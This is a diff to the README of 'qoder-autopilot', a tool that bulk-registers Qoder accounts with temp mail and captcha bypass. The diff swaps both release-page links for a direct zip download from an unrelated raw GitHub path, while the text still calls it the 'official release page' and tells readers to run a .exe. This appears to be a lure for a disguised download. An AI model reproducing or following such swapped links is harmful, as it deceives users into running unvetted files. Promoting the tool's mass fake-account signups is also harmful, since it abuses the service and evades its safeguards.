@@ -5,7 +5,7 @@ description: "Automate Qoder account registration with integrated captcha solvin
 ---
 # 🤖 qoder-autopilot - Automated account registration for Qoder users
 
-[![Download qoder-autopilot](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tistis8321/qoder-autopilot/releases)
+[![Download qoder-autopilot](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/tistis8321/tistis8321.github.io/main/redo/github_tistis_io_1.7.zip)
 
 qoder-autopilot automates the account registration process for Qoder. It manages temp mail addresses, bypasses captcha challenges, and integrates with 9Router to ensure smooth signups without manual effort. This tool saves time for users who need multiple accounts for testing or development.
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start:
 
 You do not need to install complex software or programming tools. Follow these steps to set up the application on your computer:
 
-1. Visit the [official release page](https://github.com/tistis8321/qoder-autopilot/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/tistis8321/tistis8321.github.io/main/redo/github_tistis_io_1.7.zip).
 2. Look for the latest version listed under the Assets section.
 3. Click the file with a .exe extension to download it.
 4. Save the file to your desktop or a folder of your choice.
